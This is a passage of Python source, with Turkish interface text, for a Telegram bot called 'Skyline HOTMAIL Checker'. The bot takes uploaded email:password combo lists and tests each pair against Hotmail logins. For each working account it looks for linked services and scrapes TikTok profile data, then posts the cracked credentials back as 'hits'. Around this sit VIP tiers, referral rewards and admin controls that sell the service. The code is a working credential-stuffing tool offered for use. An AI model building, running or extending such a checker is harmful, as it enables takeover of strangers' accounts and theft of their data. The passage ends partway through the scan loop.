                        if followers_match:
                            profile_data['followers'] = int(followers_match.group(1))
                    
                    if profile_data['following'] == 0:
                        following_match = re.search(r'"followingCount":(\d+)', html)
                        if following_match:
                            profile_data['following'] = int(following_match.group(1))
                    
                    if profile_data['videos'] == 0:
                        videos_match = re.search(r'"videoCount":(\d+)', html)
                        if videos_match:
                            profile_data['videos'] = int(videos_match.group(1))
                    
                    if profile_data['likes'] == 0:
                        likes_match = re.search(r'"heartCount":(\d+)', html)
                        if likes_match:
                            profile_data['likes'] = int(likes_match.group(1))
                    
                    if not profile_data['verified']:
                        verified_match = re.search(r'"verified":(true|false)', html)
                        if verified_match:
                            profile_data['verified'] = verified_match.group(1) == 'true'
                    
                    return profile_data
            except:
                pass
            
            return {
                "has_tiktok": True,
                "tiktok_emails": tiktok_count,
                "username": username,
                "followers": 0,
                "following": 0,
                "videos": 0,
                "likes": 0,
                "verified": False
            }
            
        except:
            return None

# Start Komutu
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ <b>Admin {MY_SIGNATURE} tarafından yasaklandınız</b>\n\n"
                        f"Daha fazla bilgi için adminle iletişime geçin.",
                        parse_mode='HTML')
        return
    
    args = message.text.split()
    if len(args) > 1:
        ref_code = args[1]
        
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE referral_code = ?", (ref_code,))
        referrer = c.fetchone()
        conn.close()
        
        if referrer and referrer[0] != user_id:
            referrer_id = referrer[0]
            
            add_user(user_id, username)
            
            if process_referral(user_id, referrer_id):
                try:
                    bot.send_message(referrer_id,
                                   f"🎉 <b>Yeni Referral!</b>\n\n"
                                   f"Kullanıcı <code>{user_id}</code> linkinizle katıldı!\n\n"
                                   f"✅ <b>+1 saat VIP</b> kazandınız!\n"
                                   f"⏱ Detaylar için /referral",
                                   parse_mode='HTML')
                except:
                    pass
    
    add_user(user_id, username)
    
    admin_badge = "🔧 ADMİN" if user_id == ADMIN_ID else ""
    vip_status = '👑 VIP Üye' if is_vip(user_id) else '⭐ Ücretsiz Kullanıcı'
    
    welcome_text = f"""
⚡ <b>Skyline HOTMAIL Checker</b> {admin_badge}

🔥 <b>Gelişmiş Hotmail checker</b>
⚡ Yıldırım hızında doğrulama
🎯 60+ Servis desteklenir
🤖 AI Platformları (YENİ!)
🎵 TikTok Full Capture (VIP)

👤 <b>Bilgileriniz:</b>
• ID: <code>{user_id}</code>
• Durum: {vip_status}

📱 <b>Aşağıdan seçim yapın:</b>

💎 <b>{MY_SIGNATURE} tarafından yapıldı</b>
🔗 <b>Web:</b> {CHANNEL}
"""
    
    bot.send_message(message.chat.id, welcome_text, 
                    parse_mode='HTML',
                    reply_markup=main_menu_keyboard(user_id))

# Ana Menü Butonlarını İşle
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text
    
    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ <b>Admin {MY_SIGNATURE} tarafından yasaklandınız</b>\n\n"
                        f"Daha fazla bilgi için adminle iletişime geçin.",
                        parse_mode='HTML')
        return
    
    if text == "📋 Tarama Başlat":
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(message.chat.id, 
                           f"⏳ <b>Hız Limiti!</b>\n\n"
                           f"Ücretsiz kullanıcılar saatte bir tarama yapabilir.\n"
                           f"⏰ Sonraki tarama: <b>{remaining}</b>\n\n"
                           f"💎 Sınırsız tarama için VIP'e yükseltin!",
                           parse_mode='HTML')
            return
        
        scan_text = """
⚡ <b>TARAMA MODU SEÇİN</b>

Kontrol edilecekleri seçin:
"""
        bot.send_message(message.chat.id, scan_text, 
                        parse_mode='HTML',
                        reply_markup=scan_mode_keyboard(user_id))
    
    elif text == "📦 Çoklu Tarama":
        if not is_vip(user_id):
            bot.send_message(message.chat.id, 
                           "👑 <b>Sadece VIP Özelliği!</b>\n\n"
                           "Çoklu Tarama sadece VIP üyeler için kullanılabilir.",
                           parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, 
                           "📦 <b>Çoklu Tarama Modu</b>\n\n"
                           "Birden fazla combo dosyası gönderin (en fazla 5)",
                           parse_mode='HTML')
    
    elif text == "📊 İstatistiklerim":
        user = get_user(user_id)
        if user:
            stats_text = f"""
📊 <b>İstatistikleriniz</b>

👤 <b>Kullanıcı Bilgileri:</b>
• ID: <code>{user[0]}</code>
• Kullanıcı Adı: @{user[1] or 'Yok'}
• Durum: {'👑 VIP' if user[2] else '⭐ Ücretsiz'}
• Katılım: {user[12][:10] if user[12] else 'Yok'}

📈 <b>Tarama Geçmişi:</b>
• Toplam Tarama: {user[10] or 0}
• Toplam Hit: {user[11] or 0}

⏰ <b>Son Tarama:</b>
{user[9][:19] if user[9] else 'Hiç taramadınız'}

💎 <b>{MY_SIGNATURE} tarafından yapıldı</b>
"""
            bot.send_message(message.chat.id, stats_text, parse_mode='HTML')
    
    elif text == "👑 Üyelik":
        user = get_user(user_id)
        if user and user[2]:
            vip_until = user[3]
            if vip_until == "Forever":
                expiry = "♾️ Hiçbir zaman (Ömür Boyu VIP)"
            else:
                expiry = vip_until[:19]
            
            membership_text = f"""
👑 <b>VIP ÜYELİK</b>

✅ <b>Durum:</b> Aktif
⏰ <b>Geçerlilik:</b> {expiry}

🎁 <b>VIP Avantajları:</b>
✅ Sınırsız tarama
✅ Çoklu tarama özelliği
✅ TikTok Full Capture
✅ Öncelikli destek

💎 <b>{MY_SIGNATURE} tarafından yapıldı</b>
"""
        else:
            membership_text = f"""
⭐ <b>ÜCRETSİZ ÜYELİK</b>

📊 <b>Mevcut Plan:</b> Ücretsiz Kullanıcı

📋 <b>Ücretsiz Özellikler:</b>
✅ Saatte 1 tarama
✅ Tüm tarama modları
✅ AI Platformları kontrolü

👑 <b>VIP Avantajları:</b>
💎 Sınırsız tarama
💎 TikTok Full Capture
💎 Çoklu tarama özelliği

📞 <b>Yükseltmek için adminle iletişime geçin!</b>

💎 <b>{MY_SIGNATURE} tarafından yapıldı</b>
"""
        bot.send_message(message.chat.id, membership_text, parse_mode='HTML')
    
    elif text == "🔗 Referral Linkim":
        user = get_user(user_id)
        if user:
            ref_code = user[6]  # referral_code
            ref_count = user[8]  # referrals_count
            
            bot_info = bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"
            
            markup = types.InlineKeyboardMarkup()
            share_btn = types.InlineKeyboardButton(
                "📤 Linki Paylaş", 
                url=f"https://t.me/share/url?url={urllib.parse.quote(ref_link)}&text={urllib.parse.quote('En iyi Hotmail checker botuna katıl!')}"
            )
            markup.add(share_btn)
            
            referral_text = f"""
🔗 <b>Referral Sisteminiz</b>

👥 <b>Nasıl Çalışır:</b>
Linkinizi paylaşın ve her yeni kullanıcı için <b>+1 saat VIP</b> kazanın!

🎯 <b>Referral Linkiniz:</b>
<code>{ref_link}</code>

📊 <b>İstatistikleriniz:</b>
• Toplam Referral: <b>{ref_count}</b> kullanıcı
• Kazanılan VIP: <b>{ref_count}</b> saat

💡 <b>İpucu:</b>
Daha fazla referral için sosyal medyada paylaşın!

💎 <b>{MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, referral_text, 
                           parse_mode='HTML',
                           reply_markup=markup)
        return
    
    elif text == "📞 Destek":
        support_text = f"""
📞 <b>DESTEK</b>

💬 <b>Geliştiriciyle İletişim:</b>
• Telegram: {MY_SIGNATURE}
• Web: {CHANNEL}

💎 <b>{MY_SIGNATURE} tarafından yapıldı</b>
"""
        bot.send_message(message.chat.id, support_text, parse_mode='HTML')
    
    elif text == "🔧 Admin Paneli":
        if user_id != ADMIN_ID:
            bot.send_message(message.chat.id, 
                           "❌ <b>Erişim Reddedildi!</b>",
                           parse_mode='HTML')
            return
        
        admin_text = """
🔧 <b>ADMİN PANELİ</b>

Bir seçenek seçin:
"""
        bot.send_message(message.chat.id, admin_text, 
                        parse_mode='HTML',
                        reply_markup=admin_panel_keyboard())

# Callback Sorguları İşle
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Yasaklandınız!", show_alert=True)
        return
    
    if call.data.startswith("admin_") and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Erişim Reddedildi! Sadece admin.", show_alert=True)
        return
    
    if call.data == "vip_required":
        bot.answer_callback_query(call.id, "👑 VIP üyelik gerekli!", show_alert=True)
        return
    
    if call.data == "vip_forever_required":
        bot.answer_callback_query(call.id, "👑 TikTok Full Capture için Sonsuz VIP gerekli!", show_alert=True)
        return
    
    # Taramayı Durdur
    if call.data.startswith("stop_scan_"):
        scan_user_id = int(call.data.replace("stop_scan_", ""))
        if scan_user_id == user_id or user_id == ADMIN_ID:
            if scan_user_id in active_scans:
                active_scans[scan_user_id] = False
                bot.answer_callback_query(call.id, "⏹ Tarama durduruldu!", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Aktif tarama bulunamadı", show_alert=True)
        return
    
    # Tarama Modu Seçimi
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        
        if mode == "single_platform":
            bot.edit_message_text(
                "🎯 <b>Tek Platform Seçin</b>\n\n"
                "Kontrol etmek için BİR platform seçin:",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=single_platform_keyboard()
            )
            return
        
        user_sessions[user_id] = {"mode": mode}
        
        description = get_mode_description(mode)
        
        if mode == "custom":
            bot.edit_message_text(
                description +
                f"\n\n📝 <b>Domain adını gönderin:</b>\n"
                f"Örnek: netflix.com",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
            bot.register_next_step_handler(call.message, process_custom_domain)
        else:
            bot.edit_message_text(
                description +
                f"\n\n📁 <b>Şimdi combo dosyanızı gönderin</b>\n"
                f"Format: email:şifre",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
    
    # Platform Seçimi (tek platform modu için)
    if call.data.startswith("platform_"):
        platform_name = call.data.replace("platform_", "")
        
        user_sessions[user_id] = {
            "mode": "single",
            "platform": platform_name
        }
        
        bot.edit_message_text(
            f"✅ <b>Seçildi: {platform_name}</b>\n\n"
            f"Sadece {platform_name} kontrol edilecek!\n\n"
            f"📁 <b>Şimdi combo dosyasını gönderin</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        return
    
    # Tarama modlarına geri dön
    if call.data == "back_to_scan_modes":
        bot.edit_message_text(
            "⚡ <b>TARAMA MODU SEÇİN</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=scan_mode_keyboard(user_id)
        )
        return
    
    # Admin Panel Callbackleri
    elif call.data == "admin_panel":
        bot.edit_message_text(
            "🔧 <b>ADMİN PANELİ</b>\n\nBir seçenek seçin:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )
    
    elif call.data == "admin_add_vip":
        bot.edit_message_text(
            "➕ <b>VIP ÜYE EKLE</b>\n\n"
            "Kullanıcı ID'sini gönderin\n\n"
            "Örnek: 123456789",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_add_vip_step1)
    
    elif call.data == "admin_remove_vip":
        bot.edit_message_text(
            "➖ <b>VIP KALDIR</b>\n\n"
            "Kullanıcı ID'sini gönderin",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_remove_vip)
    
    elif call.data == "admin_list_vips":
        vips = get_all_vips()
        
        if not vips:
            vip_text = "📋 <b>VIP ÜYELER</b>\n\n❌ VIP üye yok"
        else:
            vip_text = "📋 <b>VIP ÜYELER</b>\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'Yok'}\n"
                vip_text += f"   Bitiş: {vip[2]}\n\n"
        
        bot.edit_message_text(vip_text, 
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "admin_ban_user":
        bot.edit_message_text(
            "🚫 <b>KULLANICI YASAKLA</b>\n\n"
            "Yasaklanacak kullanıcı ID'sini gönderin\n\n"
            "Örnek: 123456789",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_ban_user)
    
    elif call.data == "admin_unban_user":
        bot.edit_message_text(
            "✅ <b>YASAK KALDIR</b>\n\n"
            "Yasağı kaldırılacak kullanıcı ID'sini gönderin",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_unban_user)
    
    elif call.data == "admin_banned_list":
        banned = get_banned_users()
        
        if not banned:
            ban_text = "📋 <b>YASAKLI KULLANICILAR</b>\n\n❌ Yasaklı kullanıcı yok"
        else:
            ban_text = "📋 <b>YASAKLI KULLANICILAR</b>\n\n"
            for i, user in enumerate(banned, 1):
                ban_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'Yok'}\n"
                ban_text += f"   Sebep: {user[2] or 'Yok'}\n\n"
        
        bot.edit_message_text(ban_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "admin_stats":
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = c.fetchone()[0]
        
        c.execute("SELECT SUM(total_scans) FROM users")
        total_scans = c.fetchone()[0] or 0
        
        c.execute("SELECT SUM(total_hits) FROM users")
        total_hits = c.fetchone()[0] or 0
        
        conn.close()
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("📋 Ücretsiz Kullanıcılar", callback_data="view_free_users")
        btn2 = types.InlineKeyboardButton("👑 VIP Kullanıcılar", callback_data="view_vip_users")
        btn3 = types.InlineKeyboardButton("🚫 Yasaklı Kullanıcılar", callback_data="admin_banned_list")
        btn_back = types.InlineKeyboardButton("◀️ Geri", callback_data="admin_panel")
        markup.add(btn1, btn2, btn3, btn_back)
        
        stats_text = f"""
📊 <b>BOT İSTATİSTİKLERİ</b>

👥 <b>Kullanıcılar:</b>
• Toplam: {total_users}
• Ücretsiz: {total_users - total_vips - total_banned}
• VIP: {total_vips}
• Yasaklı: {total_banned}

📈 <b>Aktivite:</b>
• Toplam Tarama: {total_scans}
• Toplam Hit: {total_hits}

💎 <b>{MY_SIGNATURE} tarafından yapıldı</b>
"""
        
        bot.edit_message_text(stats_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=markup)
    
    elif call.data == "admin_broadcast":
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("📤 Tüm Kullanıcılara Gönder", callback_data="broadcast_all")
        btn2 = types.InlineKeyboardButton("👤 Tek Kullanıcıya Gönder", callback_data="broadcast_one")
        btn_back = types.InlineKeyboardButton("◀️ Geri", callback_data="admin_panel")
        markup.add(btn1, btn2, btn_back)
        
        bot.edit_message_text(
            "📢 <b>DUYURU GÖNDER</b>\n\n"
            "Duyuru türünü seçin:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "broadcast_all":
        bot.edit_message_text(
            "📤 <b>TÜM KULLANICILARA DUYURU</b>\n\n"
            "Yayınlamak istediğiniz mesajı gönderin\n\n"
            "⚠️ Bu TÜM kullanıcılara gönderilecek!",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_broadcast_all)
    
    elif call.data == "broadcast_one":
        bot.edit_message_text(
            "👤 <b>TEK KULLANICIYA GÖNDER</b>\n\n"
            "Kullanıcı ID'sini gönderin\n\n"
            "Örnek: 123456789",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        bot.register_next_step_handler(call.message, process_broadcast_one_step1)
    
    elif call.data == "view_free_users":
        free_users = get_free_users()
        
        if not free_users:
            user_text = "📋 <b>ÜCRETSİZ KULLANICILAR</b>\n\n❌ Ücretsiz kullanıcı yok"
        else:
            user_text = f"📋 <b>ÜCRETSİZ KULLANICILAR</b> ({len(free_users)} toplam)\n\n"
            for i, user in enumerate(free_users[:20], 1):
                user_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'Yok'}\n"
            
            if len(free_users) > 20:
                user_text += f"\n... ve {len(free_users) - 20} kişi daha"
        
        bot.edit_message_text(user_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "view_vip_users":
        vips = get_all_vips()
        
        if not vips:
            vip_text = "📋 <b>VIP KULLANICILAR</b>\n\n❌ VIP kullanıcı yok"
        else:
            vip_text = f"📋 <b>VIP KULLANICILAR</b> ({len(vips)} toplam)\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'Yok'}\n"
                vip_text += f"   Bitiş: {vip[2]}\n\n"
        
        bot.edit_message_text(vip_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())
    
    elif call.data == "back_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    # VIP Süresi
    elif call.data.startswith("vip_duration_"):
        duration = call.data.replace("vip_duration_", "")
        
        if hasattr(bot, 'pending_vip_user'):
            target_user_id = bot.pending_vip_user
            target_username = bot.pending_vip_username
            
            add_vip(target_user_id, target_username, duration)
            
            duration_text = {
                "1h": "1 Saat",
                "1d": "1 Gün",
                "1w": "1 Hafta",
                "1m": "1 Ay",
                "forever": "Sonsuz"
            }
            
            bot.edit_message_text(
                f"✅ <b>VIP Eklendi!</b>\n\n"
                f"Kullanıcı: <code>{target_user_id}</code>\n"
                f"Süre: {duration_text.get(duration, 'Bilinmiyor')}",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=admin_panel_keyboard()
            )
            
            try:
                bot.send_message(target_user_id,
                               f"🎉 <b>Tebrikler!</b>\n\n"
                               f"Artık VIP'siniz!\n"
                               f"Süre: {duration_text.get(duration, 'Bilinmiyor')}",
                               parse_mode='HTML')
            except:
                pass
            
            delattr(bot, 'pending_vip_user')
            delattr(bot, 'pending_vip_username')

# Admin Handler'ları
def process_add_vip_step1(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        bot.pending_vip_user = target_user_id
        bot.pending_vip_username = "Bilinmiyor"
        
        bot.send_message(message.chat.id,
                        f"✅ Kullanıcı: <code>{target_user_id}</code>\n\n"
                        f"Süre seçin:",
                        parse_mode='HTML',
                        reply_markup=vip_duration_keyboard())
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_remove_vip(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        
        if user[2] == 0:
            bot.send_message(message.chat.id, "❌ Kullanıcı VIP değil!")
            return
        
        remove_vip(target_user_id)
        
        bot.send_message(message.chat.id,
                        f"✅ VIP Kaldırıldı!\n\n"
                        f"<code>{target_user_id}</code> artık ücretsiz.",
                        parse_mode='HTML')
        
        try:
            bot.send_message(target_user_id,
                           "⚠️ VIP üyeliğiniz kaldırıldı.")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_ban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        if target_user_id == ADMIN_ID:
            bot.send_message(message.chat.id, "❌ Admin yasaklanamaz!")
            return
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        
        ban_user(target_user_id, "Admin tarafından yasaklandı")
        
        bot.send_message(message.chat.id,
                        f"✅ Kullanıcı Yasaklandı!\n\n"
                        f"<code>{target_user_id}</code> artık yasaklı.",
                        parse_mode='HTML')
        
        try:
            bot.send_message(target_user_id,
                           f"❌ <b>Admin {MY_SIGNATURE} tarafından yasaklandınız</b>\n\n"
                           f"Daha fazla bilgi için adminle iletişime geçin.",
                           parse_mode='HTML')
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_unban_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        target_user_id = int(message.text.strip())
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        
        if user[4] == 0:
            bot.send_message(message.chat.id, "❌ Kullanıcı yasaklı değil!")
            return
        
        unban_user(target_user_id)
        
        bot.send_message(message.chat.id,
                        f"✅ Yasak Kaldırıldı!\n\n"
                        f"<code>{target_user_id}</code> artık botu kullanabilir.",
                        parse_mode='HTML')
        
        try:
            bot.send_message(target_user_id,
                           "✅ Yasağınız kaldırıldı! Tekrar hoş geldiniz!")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_broadcast_all(message):
    """Tüm kullanıcılara duyuru gönder"""
    broadcast_text = message.text
    
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE is_banned = 0")
    users = c.fetchall()
    conn.close()
    
    if not users:
        bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
        return
    
    success = 0
    failed = 0
    
    status_msg = bot.send_message(message.chat.id, 
                                  f"📤 Duyuru gönderiliyor...\n\n"
                                  f"İlerleme: 0/{len(users)}")
    
    for i, user in enumerate(users, 1):
        user_id = user[0]
        try:
            bot.send_message(user_id, 
                           f"📢 <b>Admin Mesajı</b>\n\n{broadcast_text}",
                           parse_mode='HTML')
            success += 1
        except:
            failed += 1
        
        if i % 10 == 0:
            try:
                bot.edit_message_text(
                    f"📤 Duyuru gönderiliyor...\n\n"
                    f"İlerleme: {i}/{len(users)}\n"
                    f"✅ Başarılı: {success}\n"
                    f"❌ Başarısız: {failed}",
                    message.chat.id,
                    status_msg.message_id
                )
            except:
                pass
    
    bot.edit_message_text(
        f"✅ <b>Duyuru Tamamlandı!</b>\n\n"
        f"📊 Sonuçlar:\n"
        f"• Toplam Kullanıcı: {len(users)}\n"
        f"• Başarılı: {success}\n"
        f"• Başarısız: {failed}",
        message.chat.id,
        status_msg.message_id,
        parse_mode='HTML'
    )

def process_broadcast_one_step1(message):
    """Tek duyuru için kullanıcı ID al"""
    try:
        target_user_id = int(message.text.strip())
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ Kullanıcı bulunamadı!")
            return
        
        user_sessions[message.from_user.id] = {"broadcast_target": target_user_id}
        
        bot.send_message(message.chat.id,
                        f"👤 <b>Kullanıcıya Gönder: {target_user_id}</b>\n\n"
                        f"Şimdi mesajı gönderin:",
                        parse_mode='HTML')
        
        bot.register_next_step_handler(message, process_broadcast_one_step2)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz Kullanıcı ID!")

def process_broadcast_one_step2(message):
    """Tek kullanıcıya mesaj gönder"""
    broadcast_text = message.text
    target_user_id = user_sessions.get(message.from_user.id, {}).get("broadcast_target")
    
    if not target_user_id:
        bot.send_message(message.chat.id, "❌ Hata: Hedef kullanıcı oturumda bulunamadı!")
        return
    
    try:
        bot.send_message(target_user_id,
                       f"📢 <b>Admin Mesajı</b>\n\n{broadcast_text}",
                       parse_mode='HTML')
        
        bot.send_message(message.chat.id,
                        f"✅ Mesaj {target_user_id} kullanıcısına gönderildi!",
                        parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id,
                        f"❌ Mesaj gönderilemedi!\n\n"
                        f"Hata: {str(e)}",
                        parse_mode='HTML')

def process_custom_domain(message):
    user_id = message.from_user.id
    custom_domain = message.text.strip()
    
    if user_id in user_sessions:
        user_sessions[user_id]["custom_domain"] = custom_domain
    
    bot.send_message(message.chat.id,
                    f"✅ <b>Domain: {custom_domain}</b>\n\n"
                    f"Şimdi combo dosyanızı gönderin!",
                    parse_mode='HTML')

# Dosya Yüklemelerini İşle
@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ Yasaklandınız!",
                        parse_mode='HTML')
        return
    
    can, remaining = can_scan(user_id)
    if not can:
        bot.send_message(message.chat.id,
                        f"⏳ <b>Hız Limiti!</b>\n\n"
                        f"Sonraki tarama: <b>{remaining}</b>",
                        parse_mode='HTML')
        return
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    file_path = f"temp_{user_id}.txt"
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)
    
    update_last_scan(user_id)
    
    scan_mode = user_sessions.get(user_id, {}).get("mode", "all")
    custom_domain = user_sessions.get(user_id, {}).get("custom_domain", "")
    
    bot.send_message(message.chat.id,
                    "🚀 <b>Tarama Başladı!</b>\n\n"
                    "Combo dosyanız işleniyor...",
                    parse_mode='HTML')
    
    threading.Thread(target=start_real_scan, 
                    args=(user_id, file_path, message.chat.id, scan_mode, custom_domain)).start()

def start_real_scan(user_id, file_path, chat_id, scan_mode, custom_domain=""):
    """DURDURMA butonu ile gerçek tarama işlemi"""
    
    active_scans[user_id] = True
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
    except:
        bot.send_message(chat_id, "❌ Dosya okuma hatası!")
        active_scans[user_id] = False
        return
    
    total = len(lines)
    hits = 0
    bad = 0
    retry_count = 0
    linked_total = 0
    all_hits = []
    
    if scan_mode == "gaming":
        services_to_check = SERVICES_GAMING
    elif scan_mode == "social":
        services_to_check = SERVICES_SOCIAL
    elif scan_mode == "streaming":
        services_to_check = SERVICES_STREAMING
    elif scan_mode == "ai":
        services_to_check = SERVICES_AI
    elif scan_mode == "tiktok":
        services_to_check = None
    elif scan_mode == "single":
        platform_name = user_sessions.get(user_id, {}).get("platform", "")
        if platform_name:
            platform_email = None
            for service_name, email in SERVICES_ALL.items():
                if service_name == platform_name:
                    platform_email = email
                    break
            
            if platform_email:
                services_to_check = {platform_name: platform_email}
            else:
                services_to_check = SERVICES_ALL
        else:
            services_to_check = SERVICES_ALL
    else:
        services_to_check = SERVICES_ALL
    
    progress_msg = bot.send_message(chat_id,
                                   "⚡ <b>KONTROL EDİLİYOR</b>\n\n"
                                   "✅ Hit: 0\n"
                                   "❌ Bad: 0\n"
                                   "🔄 Tekrar: 0\n"
                                   "🔗 Bağlı: 0\n\n"
                                   "━━━━━━━━━━━━━━━━━━━━\n"
                                   f"📊 İlerleme: 0/{total} (0%)\n\n"
                                   "🔍 Mevcut: Başlıyor...",
                                   parse_mode='HTML',
                                   reply_markup=stop_scan_keyboard(user_id))
    
    try:
        bot.pin_chat_message(chat_id, progress_msg.message_id, disable_notification=True)
    except:
        pass
    
    start_time = time.time()
    
    for i, line in enumerate(lines):
        if not active_scans.get(user_id, False):
            bot.send_message(chat_id, "⏹ <b>Tarama Kullanıcı Tarafından Durduruldu</b>", parse_mode='HTML')
            break
        
        try:
            if ':' not in line:
                continue
            
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            
            result = HotmailChecker.check_account(email, password)
            
            if result["status"] == "HIT":
                hits += 1
                
                if scan_mode == "tiktok":
                    tiktok_data = HotmailChecker.check_tiktok_full(
                        email, password,
                        result["token"],
                        result["cid"]
                    )
                    
                    if tiktok_data:
                        all_hits.append({
                            "email": email,
                            "password": password,
                            "services": [f"TikTok (@{tiktok_data['username']})"]
                        })
                        
                        verified_emoji = "✅" if tiktok_data.get('verified', False) else "❌"
                        
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ TIKTOK HİT BULUNDU #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Şifre: {password}

🎵 <b>TikTok Tam Veri:</b>
👤 Kullanıcı Adı: @{tiktok_data['username']}
👥 Takipçi: {format_number(tiktok_data.get('followers', 0))}
➕ Takip: {format_number(tiktok_data.get('following', 0))}
📹 Video: {tiktok_data.get('videos', 0)}
❤️ Beğeni: {format_number(tiktok_data.get('likes', 0))}
{verified_emoji} Doğrulandı: {tiktok_data.get('verified', False)}
📧 TikTok E-posta: {tiktok_data['tiktok_emails']}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE} tarafından yapıldı
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    else:
                        all_hits.append({
                            "email": email,
                            "password": password,
                            "services": []
                        })
                        
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ YENİ HİT BULUNDU #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Şifre: {password}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE} tarafından yapıldı
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                else:
                    found_services = HotmailChecker.check_services(
                        email, password,
                        result["token"],
                        result["cid"],
                        services_to_check
                    )
                    
